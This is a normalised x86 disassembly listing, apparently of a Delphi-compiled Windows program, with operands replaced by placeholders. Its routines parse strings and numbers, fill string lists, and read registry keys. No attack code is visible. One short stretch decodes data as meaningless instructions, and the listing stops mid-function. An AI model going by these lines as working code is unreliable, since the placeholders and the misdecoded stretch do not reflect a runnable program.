mov eax [ r-xdata ]
call sub_462614
cmp eax 0xffff
jbe r-xdata
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x2
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x1c ]
mov eax [ r-xdata ]
call sub_462614
mov edx eax
cmp edx 0xffff
jbe r-xdata
call sub_403e2c
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov eax [ r-xdata ]
pop ecx
call sub_462750
fstp [ ebp - 0x10 ]
fwait
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
inc eax
cmp [ edx + eax - 0x1 ] 0x2b
jne r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x2d
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
fld [ ebp - 0x10 ]
fchs
fstp [ ebp - 0x10 ]
fwait
sub_470cf0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_470d9c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_470214
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp - 0x4 ]
call sub_405120
cmp eax 0x5
jge r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_470b48
fstp [ ebp - 0x18 ]
fwait
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470da3
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
fld [ ebp - 0x10 ]
fsub [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x18 ]
fabs
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jae r-xdata
mov eax [ r-xdata ]
call sub_463378
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
sub_470db0
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_47165d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471664
lea eax [ ebp - 0x30 ]
mov edx 0x7
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
call sub_4706bc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_471633
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_471616
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000000
mov eax [ ebp - 0xc ]
call sub_420e5c
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_420fe8
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4213a0
test eax eax
jl r-xdata
call sub_403e34
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_420fe8
test al al
je r-xdata
inc eax
mov [ ebp - 0x14 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47161d
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4213a0
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
call sub_420fe8
test al al
je r-xdata
test eax eax
jl r-xdata
call sub_403e34
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x1
mov edx 0x1
call sub_405384
mov eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405270
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_421600
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
inc eax
mov [ ebp - 0x14 ] eax
xor esi esi
lea ecx [ ebp - 0x24 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41879c
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_421600
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41879c
lea ecx [ ebp - 0x2c ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_420fe8
test al al
je r-xdata
sub_47292c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_472a4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_464d1c
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_464d1c
mov eax [ ebp - 0x8 ]
call sub_405120
test eax eax
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x2e
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405170
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472a56
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404e68
retn
sub_472a63
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ esi - 0x7d ]
jpo r-xdata
or [ ebx - 0x3d ] bl
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
add [ edx + ecx - 0x75 ] dh
ror [ ebx + 0x53ff0c43 ] cl
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_472a94
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_472aeb
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_470db0
mov cl 0x3d
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_472c88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472af2
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_472af8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov [ esi + 0x4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x10 ] eax
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x4 ]
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_472b68
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x10 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x14 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_472ba8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_472c56
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ r-xdata ]
call sub_4627c0
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_464d1c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404e98
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472c5d
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_472c88
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_472df9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
test eax eax
jl r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472e00
lea eax [ ebp - 0x34 ]
mov edx 0x9
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
push eax
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
mov edx 0x1
pop ecx
call sub_405384
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
call sub_464d1c
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
call sub_403e34
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
movzx edx [ ebp - 0x9 ]
call sub_40502c
mov eax [ ebp - 0x1c ]
pop edx
call sub_405468
sub eax 0x1
jno r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x28 ]
call sub_405120
push eax
lea ecx [ ebp - 0x2c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x30 ]
movzx edx [ ebp - 0x9 ]
call sub_40502c
mov eax [ ebp - 0x30 ]
pop edx
call sub_405468
add eax 0x1
jno r-xdata
push eax
lea ecx [ ebp - 0x34 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
pop edx
pop ecx
call sub_405384
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_47292c
call sub_403e34
sub_472e08
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_472e96
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_4626c4
mov esi 0x4
xor eax eax
jmp r-xdata
cmp eax 0xffffffff
jle r-xdata
mov ebx eax
test bl bl
je r-xdata
cmp eax 0x100
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472e9d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
dec esi
jne r-xdata
mov al 0x1
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x8 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
test bl bl
je r-xdata
sub_472eb4
push ebx
push esi
mov ebx eax
mov esi [ rw-data ]
mov esi [ esi ]
mov edx ebx
mov eax r-xdata
call esi
test eax eax
je r-xdata
mov eax ebx
call sub_472e08
test al al
je r-xdata
mov eax 0x1
dec eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
call sub_403e2c
cmp eax [ ebx - 0x4 ]
jb r-xdata
inc eax
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
sub_472f0c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov esi [ rw-data ]
mov esi [ esi ]
mov edx ebx
mov eax r-xdata
call esi
push eax
mov eax ebx
call sub_405120
mov ecx eax
mov eax ebx
pop edx
call sub_405384
pop esi
pop ebx
retn
sub_472f48
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_473288
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov edx edi
mov eax esi
call ecx
dec eax
jne r-xdata
mov eax ebx
call sub_404e44
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_405120
mov edx eax
mov ecx 0x1
mov eax edi
call sub_405384
mov eax [ ebp - 0x10 ]
mov edx esi
call sub_405270
je r-xdata
mov eax ebx
